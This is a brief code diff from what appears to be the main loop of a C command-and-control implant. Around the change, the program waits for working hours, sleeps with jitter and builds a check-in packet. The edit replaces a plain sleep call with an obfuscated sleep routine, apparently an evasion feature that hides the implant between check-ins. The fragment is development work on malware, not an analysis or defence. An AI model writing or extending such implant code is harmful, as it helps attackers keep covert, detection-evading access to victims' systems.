@@ -527,7 +527,7 @@ int main(void) {
                 sleep(sleep_until_working_hours());
                 continue;
             }
-            sleep(compute_sleep(g_config.sleep_delay, g_config.sleep_jitter));
+            sleep_obf((unsigned int)compute_sleep(g_config.sleep_delay, g_config.sleep_jitter));
         }
 
         Buf*     pkt      = build_checkin_packet();
